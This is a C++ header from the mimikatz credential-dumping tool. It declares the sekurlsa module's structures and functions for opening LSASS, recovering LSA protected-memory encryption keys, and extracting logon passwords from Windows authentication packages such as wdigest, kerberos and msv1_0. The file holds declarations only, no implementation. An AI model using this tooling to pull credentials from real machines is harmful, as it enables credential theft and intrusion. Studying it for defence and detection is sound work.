/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/
*/
#pragma once
#include "globdefs.h"
#include "mod_memory.h"
#include "mod_process.h"
#include "mod_text.h"
#include "mod_system.h"
#include <iostream>
#include "secpkg.h"

#include "Security Packages/msv1_0.h"
#include "Security Packages/tspkg.h"
#include "Security Packages/wdigest.h"
#include "Security Packages/kerberos.h"
#include "Security Packages/livessp.h"
#include "Security Packages/ssp.h"

class mod_mimikatz_sekurlsa
{
public:
	typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in bool justSecurity);
private:
	typedef struct _KIWI_BCRYPT_KEY_DATA {
		DWORD size;
		DWORD tag;
		DWORD type;
		DWORD unk0;
		DWORD unk1;
		DWORD unk2;
		DWORD unk3;
		PVOID unk4;
		BYTE data; /* etc... */
	} KIWI_BCRYPT_KEY_DATA, *PKIWI_BCRYPT_KEY_DATA;

	typedef struct _KIWI_BCRYPT_KEY {
		DWORD size;
		DWORD type;
		PVOID unk0;
		PKIWI_BCRYPT_KEY_DATA cle;
		PVOID unk1;
	} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

	/* Crypto NT 5 */
	static PBYTE *g_pRandomKey, *g_pDESXKey;
	/* Crypto NT 6 */
	static PBYTE DES3Key, AESKey;
	static PKIWI_BCRYPT_KEY * hAesKey, * h3DesKey;
	static BCRYPT_ALG_HANDLE * hAesProvider, * h3DesProvider;
	
	static bool LsaInitializeProtectedMemory_NT6();
	static bool LsaCleanupProtectedMemory_NT6();

	static bool population;
	static vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
	static bool getLogonPasswords(vector<wstring> * arguments);
	static PVOID getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
public:
	static HANDLE hLSASS;
	static HMODULE hLsaSrv, hBCrypt;
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModLSASRV;
	static PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;

	static bool searchLSASSDatas();
	static PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
	static PVOID getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);

	static void genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst = false, PDWORD pos = NULL);
	static bool	getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders);

	static bool loadLsaSrv();
	static bool unloadLsaSrv();

	static vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> getMimiKatzCommands();
};
